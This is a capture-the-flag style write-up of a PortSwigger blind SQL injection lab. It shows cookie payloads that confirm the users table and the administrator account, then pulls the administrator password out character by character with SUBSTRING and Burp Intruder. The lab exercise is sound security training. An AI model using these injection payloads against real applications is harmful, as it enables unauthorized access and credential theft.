---
tags:
  - sql
  - blind
  - injection
---
# Blind SQL injection with conditional responses

## Instructions

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a`Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution

Note that if we inject an always true condition in the tracking cookie, we get the "Welcome back" message.

![](../../../../../site/_drafts/labs/PortSwigger/SQL-Injection/attachments/sqli-lab-6/file-20251124113610625.webp)

If we change it to 1=2, then the message disappears. 

![](../../../../../site/_drafts/labs/PortSwigger/SQL-Injection/attachments/sqli-lab-6/file-20251124113610627.webp)

We can confirm the presence of the 'users' table with the following:

```text title="Confirm users table"
Cookie: TrackingId=DEJ3vcjdRcpt0BQs' AND (SELECT 'a' from users LIMIT 1)='a; session=Ka4zPIbsWJdLRywMh51LGEWpkKh0SaRV
```

We can also confirm that there is a user named 'administrator' with:

```text title="Confirm administrator user"
Cookie: TrackingId=DEJ3vcjdRcpt0BQs' AND (SELECT 'a' from users WHERE username='administrator')='a; session=Ka4zPIbsWJdLRywMh51LGEWpkKh0SaRV
```

To recover the administrator user's password, we can extract one character at a time. 

```text title="Extract administrator's password"
Cookie: TrackingId=DEJ3vcjdRcpt0BQs' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='4; session=Ka4zPIbsWJdLRywMh51LGEWpkKh0SaRV
```

Add placeholders on the first 1 and the final character:

![](../../../../../site/_drafts/labs/PortSwigger/SQL-Injection/attachments/sqli-lab-6/file-20251124113610628.webp)

Running this in intruder and filtering by which responses display the "Welcome back" message will give us the administrator's password. Then we can log in as the admin and solve the lab.
